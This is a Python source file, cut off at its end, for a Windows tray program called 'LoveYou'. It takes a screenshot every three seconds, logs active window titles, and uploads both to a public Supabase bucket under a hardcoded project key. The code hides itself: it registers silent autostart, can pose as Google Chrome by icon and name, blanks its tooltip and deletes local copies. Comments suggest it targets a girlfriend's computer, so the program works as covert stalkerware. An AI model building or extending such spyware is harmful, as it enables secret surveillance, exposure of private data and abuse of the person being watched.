"""
==============================================================================
LOVEYOU SCREENSHOT SERVICE & SUPABASE LOGGER (NATIVE WINDOWS SYSTEM TRAY)
==============================================================================
Layanan native Windows untuk menangkap screenshot otomatis menggunakan mss
setiap 3 detik, dengan arsitektur producer-consumer queue untuk memastikan jeda
waktu screenshot selalu presisi tanpa terhambat latensi upload jaringan.
==============================================================================
"""

import os
import sys
import time
import queue
import ctypes
import platform
import argparse
import threading
import subprocess
import webbrowser
import configparser
from datetime import datetime, timezone
import winreg

import mss
import mss.tools
from PIL import Image, ImageDraw
import pystray
import webview
from supabase import create_client, Client


# ==============================================================================
# DEFAULT CONFIGURATION
# ==============================================================================
DEFAULT_SUPABASE_URL = "https://wqjfunxfngowxwdmyzyj.supabase.co"
DEFAULT_SUPABASE_KEY = "sb_publishable_u2lBe4CRF_2XEqbkniBjbw_p0gGEXgZ"
DEFAULT_TABLE_NAME = "hasil_ss"
DEFAULT_BUCKET_NAME = "screenshots"
DEFAULT_INTERVAL = 3  # Delay 3 detik sesuai permintaan
DEFAULT_LOCAL_FOLDER = "screenshots"
DEFAULT_APP_NAME = "LoveYou"


DAYS_ID = {
    0: "Senin",
    1: "Selasa",
    2: "Rabu",
    3: "Kamis",
    4: "Jumat",
    5: "Sabtu",
    6: "Minggu",
}


def get_base_dir() -> str:
    """Mengembalikan direktori dasar (lokasi script atau exe)."""
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))


def get_frontend_path() -> str:
    """
    Mencari path ke frontend/src/index.html.
    - Frozen (exe di root):  <exe_dir>/frontend/src/index.html
    - Dev (backend/script):  <backend_dir>/../frontend/src/index.html
    - Bundled (_MEIPASS):    <meipass>/frontend/src/index.html
    """
    # PyInstaller bundle (--add-data)
    meipass = getattr(sys, "_MEIPASS", None)
    if meipass:
        p = os.path.join(meipass, "frontend", "src", "index.html")
        if os.path.exists(p):
            return p

    base = get_base_dir()
    # Frozen exe di root project
    if getattr(sys, "frozen", False):
        return os.path.join(base, "frontend", "src", "index.html")

    # Dev mode: script ada di backend/, frontend satu level di atas
    return os.path.abspath(os.path.join(base, "..", "frontend", "src", "index.html"))


def load_config() -> dict:
    """Membaca konfigurasi dari config.ini."""
    base_dir = get_base_dir()
    config_path = os.path.join(base_dir, "config.ini")

    # Untuk mode onefile PyInstaller, config.ini ada di _MEIPASS (folder temp ekstraksi)
    meipass = getattr(sys, "_MEIPASS", None)
    if meipass and not os.path.exists(config_path):
        meipass_config = os.path.join(meipass, "config.ini")
        if os.path.exists(meipass_config):
            config_path = meipass_config

    config = configparser.ConfigParser()

    conf = {
        "supabase_url": DEFAULT_SUPABASE_URL,
        "supabase_key": DEFAULT_SUPABASE_KEY,
        "table_name": DEFAULT_TABLE_NAME,
        "bucket_name": DEFAULT_BUCKET_NAME,
        "interval_seconds": DEFAULT_INTERVAL,
        "local_folder": os.path.join(base_dir, DEFAULT_LOCAL_FOLDER),
        "keep_local_file": False,
        "image_format": "webp",
        "jpg_quality": 75,
        "auto_start": True,
        "app_name": DEFAULT_APP_NAME,
        "show_tray_notifications": False,
        "emergency_hotkey": True,
        "hotkey_combo": "Ctrl+Shift+F12",
        "tray_icon": "heart.ico",
    }

    if os.path.exists(config_path):
        try:
            config.read(config_path, encoding="utf-8")
            if "SUPABASE" in config:
                conf["supabase_url"] = config["SUPABASE"].get("url", conf["supabase_url"]).strip()
                conf["supabase_key"] = config["SUPABASE"].get("key", conf["supabase_key"]).strip()
                conf["table_name"] = config["SUPABASE"].get("table_name", conf["table_name"]).strip()
                conf["bucket_name"] = config["SUPABASE"].get("bucket_name", conf["bucket_name"]).strip()

            if "CAPTURE" in config:
                conf["interval_seconds"] = config["CAPTURE"].getint("interval_seconds", conf["interval_seconds"])
                folder_name = config["CAPTURE"].get("local_folder", DEFAULT_LOCAL_FOLDER).strip()
                conf["local_folder"] = folder_name if os.path.isabs(folder_name) else os.path.join(base_dir, folder_name)
                conf["keep_local_file"] = config["CAPTURE"].getboolean("keep_local_file", conf["keep_local_file"])
                conf["image_format"] = config["CAPTURE"].get("image_format", conf["image_format"]).strip().lower()
                conf["jpg_quality"] = config["CAPTURE"].getint("jpg_quality", conf["jpg_quality"])

            if "STARTUP" in config:
                conf["auto_start"] = config["STARTUP"].getboolean("auto_start", conf["auto_start"])
                conf["app_name"] = config["STARTUP"].get("app_name", conf["app_name"]).strip()

            if "TRAY" in config:
                conf["show_tray_notifications"] = config["TRAY"].getboolean("notifications", conf["show_tray_notifications"])
                conf["tray_icon"] = config["TRAY"].get("icon", conf["tray_icon"]).strip()

            if "SECURITY" in config:
                conf["emergency_hotkey"] = config["SECURITY"].getboolean("emergency_hotkey", conf["emergency_hotkey"])
                conf["hotkey_combo"] = config["SECURITY"].get("hotkey_combo", conf["hotkey_combo"]).strip()
        except Exception as e:
            print(f"[WARN] Gagal membaca config.ini ({e}), menggunakan default.")

    # Deteksi otomatis ikon Chrome jika nama aplikasi disamarkan sebagai Chrome
    if "chrome" in conf.get("app_name", "").lower() and conf.get("tray_icon") == "heart.ico":
        conf["tray_icon"] = "chrome.ico"

    return conf


# ==============================================================================
# WINDOWS HELPERS & STARTUP (REGISTRY + STARTUP FOLDER)
# ==============================================================================
def get_active_window_title() -> str:
    """Mendapatkan judul jendela Windows yang sedang aktif/fokus saat ini."""
    try:
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return ""
        length = user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buff = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
    except Exception:
        pass
    return ""


def register_startup(app_name: str) -> bool:
    """
    Mendaftarkan aplikasi ke Windows Startup melalui dua jalur:
    1. Windows Registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
    2. Folder Startup Pengguna (%APPDATA%\\...\\Startup\\LoveYou.lnk)
    Menggunakan argumen --silent agar saat laptop menyala, berjalan di latar belakang tanpa pop-up.
    """
    success = False
    base_dir = get_base_dir()

    if getattr(sys, "frozen", False):
        target_path = sys.executable
        work_dir = base_dir
        cmd = f'"{target_path}" --silent'
    else:
        target_path = os.path.abspath(__file__)
        work_dir = base_dir
        pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        cmd = f'"{pythonw}" "{target_path}" --silent'

    # 1. Daftarkan ke Registry Run Key
    try:
        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE)

        for old_name in ["Google Chrome", "Chrome"]:
            try:
                winreg.DeleteValue(key, old_name)
            except FileNotFoundError:
                pass

        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        success = True
    except Exception as e:
        print(f"[WARN] Registry startup registration failed: {e}")

    # 2. Buat Shortcut di Folder Startup (Shell:Startup)
    try:
        startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        lnk_path = os.path.join(startup_dir, f"{app_name}.lnk")

        vbs_content = (
            f'Set ws = WScript.CreateObject("WScript.Shell")\n'
            f'Set lnk = ws.CreateShortcut("{lnk_path}")\n'
            f'lnk.TargetPath = "{target_path}"\n'
            f'lnk.Arguments = "--silent"\n'
            f'lnk.WorkingDirectory = "{work_dir}"\n'
            f'lnk.Save\n'
        )
        temp_vbs = os.path.join(base_dir, "_create_lnk.vbs")
        with open(temp_vbs, "w", encoding="utf-8") as f:
            f.write(vbs_content)

        os.system(f'cscript //nologo "{temp_vbs}"')
        if os.path.exists(temp_vbs):
            os.remove(temp_vbs)
        success = True
    except Exception as e:
        print(f"[WARN] Startup folder shortcut creation failed: {e}")

    return success


def unregister_startup(app_name: str) -> bool:
    """Menghapus aplikasi dari Windows Startup (Registry dan folder Startup)."""
    try:
        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE)
        for name in [app_name, "LoveYou", "loveyou", "Google Chrome", "Chrome"]:
            try:
                winreg.DeleteValue(key, name)
            except FileNotFoundError:
                pass
        winreg.CloseKey(key)
    except Exception:
        pass

    try:
        startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        for f in [f"{app_name}.lnk", f"{app_name}.exe", "LoveYou.lnk", "loveyou.lnk", "Chrome.lnk"]:
            p = os.path.join(startup_dir, f)
            if os.path.exists(p):
                os.remove(p)
    except Exception:
        pass

    return True


def uninstall_and_clean_exit(controller):
    """
    Menonaktifkan layanan, mencabut dari Windows Startup (Registry & Startup folder),
    membersihkan seluruh file dan folder screenshot lokal / temp, dan menghentikan proses aplikasi.
    """
    print("\n" + "=" * 65)
    print("[UNINSTALL] Memulai proses penonaktifan darurat & pembersihan total...")
    print("=" * 65)

    controller.is_running = False

    # 1. Cabut dari Windows Startup
    app_name = controller.conf.get("app_name", DEFAULT_APP_NAME)
    try:
        unregister_startup(app_name)
        print(f"[UNINSTALL OK] Aplikasi '{app_name}' berhasil dicabut dari Windows Startup.")
    except Exception as e:
        print(f"[UNINSTALL WARN] Gagal mencabut startup: {e}")

    # 2. Hapus seluruh file screenshot lokal (jika mode simpan lokal aktif)
    local_folder = controller.conf.get("local_folder")
    if local_folder and os.path.exists(local_folder):
        try:
            import shutil
            shutil.rmtree(local_folder, ignore_errors=True)
            print(f"[UNINSTALL OK] Folder lokal '{local_folder}' berhasil dihapus bersih.")
        except Exception as e:
            print(f"[UNINSTALL WARN] Gagal menghapus folder lokal: {e}")

    # 3. Hapus folder temporary capture jika ada
    try:
        import tempfile
        import shutil
        temp_dir = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            print(f"[UNINSTALL OK] Folder temporary '{temp_dir}' dibersihkan.")
    except Exception:
        pass

    # 4. Hentikan System Tray jika ada
    if controller.tray_icon:
        try:
            controller.tray_icon.stop()
            print("[UNINSTALL OK] Ikon System Tray dinonaktifkan.")
        except Exception:
            pass

    print("[UNINSTALL OK] Pembersihan selesai total. Aplikasi berhasil dihentikan.")
    print("=" * 65)
    os._exit(0)


def parse_hotkey(combo_str: str) -> tuple[int, int]:
    """
    Mengurai string kombinasi tombol keyboard (cth: 'Ctrl+Shift+F12' atau 'Ctrl+Alt+Q')
    menjadi pasangan (fs_modifiers, vk_code).
    """
    parts = [p.strip().upper() for p in (combo_str or "").replace(" ", "").split("+") if p.strip()]
    modifiers = 0
    vk = None

    vk_map = {
        "F1": 0x70, "F2": 0x71, "F3": 0x72, "F4": 0x73, "F5": 0x74, "F6": 0x75,
        "F7": 0x76, "F8": 0x77, "F9": 0x78, "F10": 0x79, "F11": 0x7A, "F12": 0x7B,
        "END": 0x23, "HOME": 0x24, "DELETE": 0x2E, "DEL": 0x2E, "ESC": 0x1B, "ESCAPE": 0x1B,
        "SPACE": 0x20, "TAB": 0x09, "BACKSPACE": 0x08,
    }

    for p in parts:
        if p in ("CTRL", "CONTROL"):
            modifiers |= 0x0002
        elif p in ("ALT", "MENU"):
            modifiers |= 0x0001
        elif p == "SHIFT":
            modifiers |= 0x0004
        elif p in ("WIN", "WINDOWS", "SUPER"):
            modifiers |= 0x0008
        elif p in vk_map:
            vk = vk_map[p]
        elif len(p) == 1 and (p.isalpha() or p.isdigit()):
            vk = ord(p)

    # Default aman jika parsing gagal: Ctrl+Shift+F12
    if not modifiers:
        modifiers = 0x0002 | 0x0004
    if not vk:
        vk = 0x7B

    return modifiers, vk


def start_emergency_hotkey_listener(controller):
    """
    Mendaftarkan Global Hotkey Windows kustom sesuai konfigurasi.
    Saat ditekan di mana saja di Windows, aplikasi akan langsung dinonaktifkan
    dan dibersihkan hingga ke akarnya.
    """
    def _listener():
        try:
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            combo_str = controller.conf.get("hotkey_combo", "Ctrl+Shift+F12")
            modifiers, vk = parse_hotkey(combo_str)

            HOTKEY_ID_CUSTOM = 0x5841  # ID untuk custom hotkey pilihan user
            HOTKEY_ID_BACKUP = 0x5842  # ID untuk backup universal Ctrl+Shift+F12

            # 1. Daftarkan custom hotkey pilihan user
            reg_custom = user32.RegisterHotKey(None, HOTKEY_ID_CUSTOM, modifiers | 0x4000, vk)
            if not reg_custom:
                reg_custom = user32.RegisterHotKey(None, HOTKEY_ID_CUSTOM, modifiers, vk)

            # 2. Daftarkan backup universal Ctrl+Shift+F12 jika berbeda
            reg_backup = False
            if (modifiers, vk) != (0x0006, 0x7B):
                reg_backup = user32.RegisterHotKey(None, HOTKEY_ID_BACKUP, 0x0006 | 0x4000, 0x7B)
                if not reg_backup:
                    reg_backup = user32.RegisterHotKey(None, HOTKEY_ID_BACKUP, 0x0006, 0x7B)

            print(f"[HOTKEY] Pintasan darurat aktif: [{combo_str}] untuk nonaktifkan & bersihkan total.")

            msg = wintypes.MSG()
            while controller.is_running and user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                if msg.message == 0x0312:  # WM_HOTKEY
                    if msg.wParam in (HOTKEY_ID_CUSTOM, HOTKEY_ID_BACKUP):
                        print(f"\n[HOTKEY TRIGGERED] Pintasan darurat terdeteksi! Memulai pembersihan...")
                        user32.UnregisterHotKey(None, HOTKEY_ID_CUSTOM)
                        if reg_backup:
                            user32.UnregisterHotKey(None, HOTKEY_ID_BACKUP)
                        uninstall_and_clean_exit(controller)
                        break
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))

            user32.UnregisterHotKey(None, HOTKEY_ID_CUSTOM)
            if reg_backup:
                user32.UnregisterHotKey(None, HOTKEY_ID_BACKUP)
        except Exception as e:
            print(f"[WARN] Emergency hotkey listener error: {e}")

    t = threading.Thread(target=_listener, daemon=True, name="EmergencyHotkeyListener")
    t.start()
    return t


# ==============================================================================
# SCREENSHOT CAPTURE ENGINE (MSS)
# ==============================================================================
def capture_screenshot(output_dir: str, image_format: str = "webp", jpg_quality: int = 75) -> tuple[str, str, str]:
    """
    Menangkap tampilan layar menggunakan mss (sangat cepat ~10ms).
    Format nama file: ss_(jam_tanggal_hari) sesuai permintaan user.
    Mendukung format modern 'webp' dengan ukuran ultra-hemat (10-50 KB) dan kualitas tajam.
    Contoh: ss_00-45-12_21-11-2026_Sabtu.webp
    Returns:
        tuple(filepath, filename, resolution)
    """
    os.makedirs(output_dir, exist_ok=True)
    now = datetime.now()
    hari = DAYS_ID.get(now.weekday(), "Hari")
    jam = now.strftime("%H-%M-%S")
    tanggal = now.strftime("%d-%m-%Y")

    fmt = (image_format or "webp").strip().lower()
    if fmt == "png":
        ext = "png"
    elif fmt in ["jpg", "jpeg"]:
        ext = "jpg"
    else:
        ext = "webp"

    base_name = f"ss_{jam}_{tanggal}_{hari}"
    filename = f"{base_name}.{ext}"
    filepath = os.path.join(output_dir, filename)

    # Antisipasi jika ada file bernama sama di detik yang sama
    counter = 1
    while os.path.exists(filepath):
        filename = f"{base_name}_{counter}.{ext}"
        filepath = os.path.join(output_dir, filename)
        counter += 1

    resolution = "Unknown"
    with mss.MSS() as sct:
        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
        resolution = f"{monitor['width']}x{monitor['height']}"
        sct_img = sct.grab(monitor)

        if ext == "png":
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=filepath)
        elif ext == "webp":
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            q = min(max(int(jpg_quality), 40), 90)
            img.save(filepath, "WEBP", quality=q, method=4)

            # Smart Budget Check: Jika ukuran melebihi 50 KB, optimasi resolusi proporsional agar 10-50 KB
            if os.path.exists(filepath) and os.path.getsize(filepath) > 51200:
                w, h = img.size
                scaled = img.resize((int(w * 0.75), int(h * 0.75)), Image.Resampling.LANCZOS)
                scaled.save(filepath, "WEBP", quality=min(q, 75), method=4)
        else:
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            q = min(max(int(jpg_quality), 10), 100)
            img.save(filepath, "JPEG", quality=q, optimize=True)

            # Smart Budget Check untuk JPEG jika melebihi 50 KB
            if os.path.exists(filepath) and os.path.getsize(filepath) > 51200:
                w, h = img.size
                scaled = img.resize((int(w * 0.70), int(h * 0.70)), Image.Resampling.LANCZOS)
                scaled.save(filepath, "JPEG", quality=min(q, 70), optimize=True)

    return filepath, filename, resolution


# ==============================================================================
# SUPABASE LOGGER & STORAGE UPLOADER
# ==============================================================================
class SupabaseLogger:
    def __init__(self, url: str, key: str, table_name: str, bucket_name: str):
        self.url = url.rstrip("/")
        self.key = key
        self.table_name = table_name
        self.bucket_name = bucket_name
        self.client: Client = create_client(self.url, self.key)

    def upload_file(self, filepath: str, remote_filename: str) -> str:
        """Mengunggah file ke Supabase Storage (bisa di dalam folder user: roedi/ss_...webp)."""
        ext = os.path.splitext(filepath)[1].lower()
        if ext in [".jpg", ".jpeg"]:
            mime_type = "image/jpeg"
        elif ext == ".webp":
            mime_type = "image/webp"
        else:
            mime_type = "image/png"

        with open(filepath, "rb") as f:
            file_bytes = f.read()

        try:
            self.client.storage.from_(self.bucket_name).upload(
                path=remote_filename,
                file=file_bytes,
                file_options={"content-type": mime_type, "upsert": "true"},
            )
        except Exception as upload_err:
            # Jika error "Duplicate" atau "already exists", coba update/upsert ulang
            err_str = str(upload_err).lower()
            if "duplicate" in err_str or "already exists" in err_str:
                try:
                    self.client.storage.from_(self.bucket_name).update(
                        path=remote_filename,
                        file=file_bytes,
                        file_options={"content-type": mime_type},
                    )
                except Exception:
                    pass  # Tetap kembalikan URL publik meskipun update gagal
            else:
                raise  # Re-raise error non-duplicate

        # Selalu kembalikan URL publik (file tersedia via public bucket)
        return f"{self.url}/storage/v1/object/public/{self.bucket_name}/{remote_filename}"

    def log_record(
        self,
        filename: str,
        image_url: str,
        resolution: str,
        active_window: str,
        file_size_bytes: int,
        status: str = "success",
        notes: str = "",
        user_name: str = "anonymous",
        storage_path: str = "",
    ) -> dict:
        """Mencatat metadata screenshot ke tabel hasil_ss dengan pemisahan user."""
        file_size_kb = round(file_size_bytes / 1024.0, 2)
        device_name = platform.node() or "Unknown"

        # Simpan user di notes sebagai jaminan jika kolom user_name belum dibuat di database
        user_tag = f"User: {user_name}"
        full_notes = f"{user_tag} | {notes}" if notes else user_tag
        final_storage_path = storage_path or f"{self.bucket_name}/{filename}"

        record = {
            "filename": filename,
            "image_url": image_url,
            "storage_path": final_storage_path,
            "device_name": device_name,
            "resolution": resolution,
            "active_window": active_window,
            "file_size_kb": file_size_kb,
            "status": status,
            "notes": full_notes,
            "created_at": datetime.now(timezone.utc).isoformat(),
        }

        # Coba simpan dengan kolom user_name terlebih dahulu
        try:
            record_with_user = dict(record)
            record_with_user["user_name"] = user_name
            response = self.client.table(self.table_name).insert(record_with_user).execute()
            return response.data
        except Exception:
            # Fallback jika kolom user_name belum ditambahkan via SQL
            response = self.client.table(self.table_name).insert(record).execute()
            return response.data


# ==============================================================================
# TRAY ICON & CONTROLLER (PRODUCER-CONSUMER QUEUE)
# ==============================================================================
def find_icon_path(icon_name: str) -> str | None:
    """
    Mencari file icon (.ico) di runtime (onefile _MEIPASS, onedir, atau dev mode).
    """
    if not icon_name:
        return None

    filename = os.path.basename(icon_name)
    candidates = []

    # 1. PyInstaller onefile temp folder (_MEIPASS)
    meipass = getattr(sys, "_MEIPASS", None)
    if meipass:
        candidates.append(os.path.join(meipass, "resources", filename))
        candidates.append(os.path.join(meipass, filename))

    base_dir = get_base_dir()
    # 2. Folder exe / workspace
    candidates.append(os.path.join(base_dir, "resources", filename))
    candidates.append(os.path.join(base_dir, "_internal", "resources", filename))
    candidates.append(os.path.join(base_dir, "backend", "resources", filename))
    candidates.append(os.path.join(base_dir, "..", "backend", "resources", filename))
    candidates.append(os.path.join(base_dir, filename))

    # 3. Path absolut jika diberikan
    if os.path.isabs(icon_name):
        candidates.insert(0, icon_name)

    for p in candidates:
        if os.path.exists(p):
            return p

    return None


def create_dynamic_heart_icon() -> Image.Image:
    """Membuat icon hati dinamis jika file heart.ico tidak ditemukan."""
    img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.polygon(
        [(32, 54), (10, 32), (10, 18), (22, 10), (32, 20), (42, 10), (54, 18), (54, 32)],
        fill=(244, 63, 94),
    )
    return img


def create_dynamic_chrome_icon() -> Image.Image:
    """Membuat logo Google Chrome dinamis jika file chrome.ico tidak ditemukan."""
    img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    # Tiga sektor lingkaran luar (Merah, Kuning, Hijau khas Chrome)
    draw.pieslice([4, 4, 60, 60], start=210, end=330, fill=(234, 67, 53))   # Merah Google
    draw.pieslice([4, 4, 60, 60], start=330, end=90, fill=(251, 188, 4))    # Kuning Google
    draw.pieslice([4, 4, 60, 60], start=90, end=210, fill=(52, 168, 83))    # Hijau Google
    # Lingkaran pemisah putih di tengah
    draw.ellipse([18, 18, 46, 46], fill=(255, 255, 255))
    # Lingkaran inti Biru Google
    draw.ellipse([22, 22, 42, 42], fill=(66, 133, 244))
    return img


def get_tray_icon_image(icon_name: str = "heart.ico") -> Image.Image:
    """
    Mengambil icon untuk System Tray sesuai preferensi konfigurasi (chrome.ico, heart.ico, dll).
    Mendukung PyInstaller onefile (_MEIPASS), onedir, dan mode dev.
    Jika file tidak ditemukan, membuat ikon dinamis (Chrome atau Heart) sebagai fallback terjamin.
    """
    is_chrome = "chrome" in (icon_name or "").lower()

    # 1. Coba cari path file ikon yang diminta
    icon_path = find_icon_path(icon_name)
    if icon_path and os.path.exists(icon_path):
        try:
            return Image.open(icon_path)
        except Exception as e:
            print(f"[WARN] Gagal membuka file icon '{icon_path}': {e}")

    # 2. Jika mode Chrome tapi file spesifik tidak ditemukan, cari fallback chrome.ico
    if is_chrome:
        chrome_fallback = find_icon_path("chrome.ico")
        if chrome_fallback and os.path.exists(chrome_fallback):
            try:
                return Image.open(chrome_fallback)
            except Exception:
                pass
        return create_dynamic_chrome_icon()

    # 3. Fallback icon hati
    heart_fallback = find_icon_path("heart.ico")
    if heart_fallback and os.path.exists(heart_fallback):
        try:
            return Image.open(heart_fallback)
        except Exception:
            pass

    return create_dynamic_heart_icon()


class ServiceController:
    def __init__(self, conf: dict):
        self.conf = conf
        self.is_running = True
        self.is_paused = False
        self.current_user = "anonymous"
        self.upload_queue = queue.Queue(maxsize=200)
        self.tray_icon: pystray.Icon | None = None
        self.supabase_logger: SupabaseLogger | None = None
        self.total_captured = 0
        self.total_uploaded = 0

        try:
            self.supabase_logger = SupabaseLogger(
                url=conf["supabase_url"],
                key=conf["supabase_key"],
                table_name=conf["table_name"],
                bucket_name=conf["bucket_name"],
            )
        except Exception as e:
            print(f"[WARN] Supabase init error: {e}")

    def set_active_user(self, name: str):
        """Menyetel user aktif saat pacar/user mengisi nama di LoveYou App."""
        cleaned = (name or "").strip()
        if not cleaned:
            return
        # Bersihkan nama agar aman untuk nama folder & file
        safe_name = "".join(c for c in cleaned if c.isalnum() or c in ("-", "_", " ")).strip()
        if safe_name:
            self.current_user = safe_name
            print(f"[USER] User aktif sekarang diubah ke: '{self.current_user}'")
            self.update_tray_status()

    def update_tray_status(self):
        """Tooltip di System Tray dikosongkan agar tidak memunculkan teks apapun saat di-hover."""
        if self.tray_icon:
            try:
                self.tray_icon.title = " "
            except Exception:
                pass

    def capture_worker(self):
        """Thread Producer: Menangkap screenshot tepat waktu sesuai interval (3s)."""
        print(f"[CAPTURE] Producer aktif. Menangkap layar setiap {self.conf['interval_seconds']} detik...")
        while self.is_running:
            start_time = time.time()
            if not self.is_paused:
                try:
                    active_window = get_active_window_title()
                    active_user = self.current_user

                    # Jika tidak simpan salinan lokal, gunakan direktori temporer Windows (%TEMP%)
                    # agar TIDAK PERNAH membuat folder 'screenshots' sama sekali di folder aplikasi.
                    if not self.conf.get("keep_local_file", True):
                        import tempfile
                        temp_base = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
                        user_dir = os.path.join(temp_base, active_user) if active_user != "anonymous" else temp_base
                    else:
                        user_dir = os.path.join(self.conf["local_folder"], active_user) if active_user != "anonymous" else self.conf["local_folder"]
                    os.makedirs(user_dir, exist_ok=True)

                    filepath, filename, resolution = capture_screenshot(
                        output_dir=user_dir,
                        image_format=self.conf["image_format"],
                        jpg_quality=self.conf["jpg_quality"],
                    )
                    file_size = os.path.getsize(filepath)
                    self.total_captured += 1

                    item = {
                        "filepath": filepath,
                        "filename": filename,
                        "resolution": resolution,
                        "active_window": active_window,
                        "file_size": file_size,
                        "user_name": active_user,
                    }
                    try:
                        self.upload_queue.put_nowait(item)
                    except queue.Full:
                        print("[WARN] Antrean upload penuh, mengabaikan screenshot tertua.")

                    self.update_tray_status()

                except mss.exception.ScreenShotError as e:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] [WARN] Layar terkunci/sesi tidak aktif: {e}")
                except Exception as e:
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] [ERROR] Capture error: {e}")

            # Hitung waktu tunggu agar interval tetap presisi
            elapsed = time.time() - start_time
            sleep_duration = max(0.1, self.conf["interval_seconds"] - elapsed)
            time.sleep(sleep_duration)

        print("[CAPTURE] Producer berhenti.")

    def uploader_worker(self):
        """Thread Consumer: Mengunggah screenshot dari antrean ke Supabase."""
        print("[UPLOADER] Consumer aktif. Mengunggah ke Supabase...")
        while self.is_running:
            try:
                item = self.upload_queue.get(timeout=1.0)
            except queue.Empty:
                continue

            filepath = item["filepath"]
            filename = item["filename"]
            resolution = item["resolution"]
            active_window = item["active_window"]
            file_size = item["file_size"]
            user_name = item.get("user_name", "anonymous")

            image_url = ""
            storage_error = None

            # Simpan di Supabase Storage dalam folder user (misal: roedi/ss_...jpg)
            storage_filename = f"{user_name}/{filename}" if user_name != "anonymous" else filename
            storage_path = f"{self.conf['bucket_name']}/{storage_filename}"

            if self.supabase_logger:
                # 1. Upload Storage
                try:
                    image_url = self.supabase_logger.upload_file(filepath, storage_filename)
                except Exception as e:
                    storage_error = str(e)
                    print(f"[UPLOAD FAIL] Storage: {e}")

                # Jika upload gagal tapi kita tahu path-nya, tetap construct URL publik
                if not image_url and not storage_error:
                    image_url = f"{self.conf['supabase_url']}/storage/v1/object/public/{self.conf['bucket_name']}/{storage_filename}"

                # 2. Catat ke Database
                try:
                    status = "success" if not storage_error else "storage_failed"
                    notes = f"Window: {active_window}" if active_window else ""
                    if storage_error:
                        notes += f" | Storage err: {storage_error}"

                    self.supabase_logger.log_record(
                        filename=filename,
                        image_url=image_url if image_url else "",
                        resolution=resolution,
                        active_window=active_window,
                        file_size_bytes=file_size,
                        status=status,
                        notes=notes,
                        user_name=user_name,
                        storage_path=storage_path,
                    )
                    self.total_uploaded += 1
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD #{self.total_uploaded} OK] [{user_name}] {filename} -> Supabase")
                except Exception as e:
                    print(f"[DB FAIL] Database log error: {e}")

            # Hapus file lokal jika keep_local_file = False
            if not self.conf["keep_local_file"] and not storage_error:
                try:
                    if os.path.exists(filepath):
                        os.remove(filepath)
                except Exception:
                    pass

            self.upload_queue.task_done()
            self.update_tray_status()

        print("[UPLOADER] Consumer berhenti.")

    # Menu Callbacks
    def on_capture_now(self, icon, item):
        try:
            active_window = get_active_window_title()
            active_user = self.current_user
            if not self.conf.get("keep_local_file", True):
                import tempfile
                temp_base = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
                target_dir = os.path.join(temp_base, active_user) if active_user != "anonymous" else temp_base
            else:
                target_dir = os.path.join(self.conf["local_folder"], active_user) if active_user != "anonymous" else self.conf["local_folder"]
            os.makedirs(target_dir, exist_ok=True)

            filepath, filename, resolution = capture_screenshot(
                output_dir=target_dir,
                image_format=self.conf["image_format"],
                jpg_quality=self.conf["jpg_quality"],
            )
            file_size = os.path.getsize(filepath)
            self.upload_queue.put_nowait({
                "filepath": filepath,
                "filename": filename,
                "resolution": resolution,
                "active_window": active_window,
                "file_size": file_size,
                "user_name": active_user,
            })
            print("[INFO] Capture instan ditambahkan ke antrean.")
        except Exception as e:
            print(f"[ERROR] Capture instan gagal: {e}")

    def on_toggle_pause(self, icon, item):
        self.is_paused = not self.is_paused
        status_text = "DIJEDA" if self.is_paused else "AKTIF"
        print(f"[STATUS] Layanan sekarang: {status_text}")
        self.update_tray_status()

    def on_open_gallery(self, icon, item):
        base_dir = get_base_dir()
        try:
            from view_results import view_results
            threading.Thread(target=view_results, kwargs={"open_browser": True}, daemon=True).start()
        except Exception:
            html_path = os.path.join(base_dir, "hasil_ss_gallery.html")
            if os.path.exists(html_path):
                webbrowser.open(f"file:///{os.path.abspath(html_path)}")

    def on_open_love_ui(self, icon, item):
        """Membuka jendela native LoveYou Frontend (pywebview)."""
        _launch_ui_subprocess()

    def on_open_supabase(self, icon, item):
        webbrowser.open("https://supabase.com/dashboard/project/wqjfunxfngowxwdmyzyj/editor")

    def on_open_local_folder(self, icon, item):
        if not self.conf.get("keep_local_file", True):
            print("[INFO] Penyimpanan lokal dinonaktifkan (100% Cloud Supabase).")
            return
        folder = self.conf["local_folder"]
        os.makedirs(folder, exist_ok=True)
        os.startfile(folder)

    def on_open_config(self, icon, item):
        base_dir = get_base_dir()
        config_path = os.path.join(base_dir, "config.ini")
        if os.path.exists(config_path):
            os.startfile(config_path)

    def on_exit(self, icon, item):
        print("[EXIT] Menghentikan LoveYou Service...")
